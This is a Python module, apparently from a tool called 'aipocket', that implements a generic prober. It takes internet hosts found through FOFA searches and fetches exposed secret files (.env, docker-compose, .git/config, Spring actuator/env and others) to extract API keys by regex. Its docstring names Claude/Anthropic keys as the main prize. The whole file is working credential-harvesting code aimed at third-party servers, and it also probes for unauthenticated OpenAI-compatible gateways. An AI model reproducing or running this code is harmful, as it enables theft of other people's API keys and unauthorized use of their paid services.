"""Generic page prober — fetches the index page and common config paths.

For hosts that don't match any product-specific prober, this catch-all fetcher
grabs the homepage and a few common credential-leak paths (.env, docker-compose,
config files) to extract API keys via regex.

This is the critical path for Claude/Anthropic keys: they rarely appear in
HTTP response headers, but are often in exposed .env files or page bodies
that FOFA body= queries matched (the body content isn't returned by FOFA,
so we must actively fetch it).

Two-tier strategy to control request volume:
- Tier 1 (8 paths): Always probed. Includes index, .env, docker-compose, etc.
- Tier 2 (16 paths): Only probed if tier 1 confirms the server exposes real files
  (i.e. returned at least one 200 with non-HTML content-type on a config path).
"""

from __future__ import annotations

import logging
from typing import Any

from aipocket.core.models import Credential
from ..base import Prober

log = logging.getLogger(__name__)

# Tier 1: Always probe these (high ROI — 8 paths)
_TIER1_PATHS: list[str] = [
    "/",                            # index page
    "/.env",                        # most common credential leak
    "/.env.production",             # production secrets
    "/docker-compose.yml",          # docker compose with secrets
    "/docker-compose.yaml",
    "/config.json",                 # generic JSON config
    "/v1/models",                   # OpenAI-compatible gateway (no auth check)
    "/.git/config",                 # git config with tokens
]

# Tier 2: Only probe if tier 1 found that the server exposes real files
# (not a SPA that returns HTML for everything).
_TIER2_PATHS: list[str] = [
    "/.env.local",
    "/.env.development",
    "/docker-compose.override.yml",
    "/.docker/config.json",
    "/config.yaml",
    "/config.yml",
    "/config.toml",
    "/application.yml",             # Spring Boot
    "/application.properties",
    "/settings.json",
    "/appsettings.json",            # .NET
    "/api/config",
    "/api/v1/models",
    "/debug/vars",                  # Go debug endpoint
    "/actuator/env",                # Spring Boot actuator
    "/.well-known/openai-plugin.json",  # ChatGPT plugin manifest
]


class GenericPageProber(Prober):
    """Catch-all prober for hosts that don't match any product fingerprint.

    Two-tier strategy:
    - Tier 1 (8 paths): Always probed. Includes index, .env, docker-compose, etc.
    - Tier 2 (16 paths): Only probed if tier 1 confirms the server exposes files
      (returned at least one non-HTML 200 on a config path).
    """

    product_name = "generic"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        return False

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        creds: list[Credential] = []
        seen_keys: set[str] = set()
        has_exposed_files = False

        # --- Tier 1: always probe ---
        for path in _TIER1_PATHS:
            found, is_file = await self._probe_path(hit, path, seen_keys)
            creds.extend(found)
            if is_file and path != "/":
                has_exposed_files = True

        # --- Tier 2: only if server exposes static files ---
        if has_exposed_files:
            for path in _TIER2_PATHS:
                found, _ = await self._probe_path(hit, path, seen_keys)
                creds.extend(found)

        return creds

    async def _probe_path(
        self, hit: dict[str, Any], path: str, seen_keys: set[str]
    ) -> tuple[list[Credential], bool]:
        """Probe a single path. Returns (credentials, is_real_file).

        is_real_file=True means the response was 200 with non-HTML content-type,
        indicating the server actually serves static files at this path.
        """
        url = self._url(hit, path)
        if not url:
            return [], False

        resp = await self._get(url)
        if resp is None:
            return [], False

        if resp.status_code != 200:
            return [], False

        content_type = resp.headers.get("content-type", "")
        is_html = "text/html" in content_type

        # For non-index paths, skip HTML responses (SPA fallback routing)
        if path != "/" and is_html:
            return [], False

        body = resp.text
        if not body or len(body) < 10:
            return [], False
        if len(body) > 50_000:
            body = body[:50_000]

        is_real_file = not is_html

        found = self._extract_from_response(
            resp, hit, f"generic_{path.strip('/').replace('/', '_') or 'index'}"
        )
        new_creds: list[Credential] = []
        for c in found:
            if c.apikey not in seen_keys:
                seen_keys.add(c.apikey)
                new_creds.append(c)

        return new_creds, is_real_file
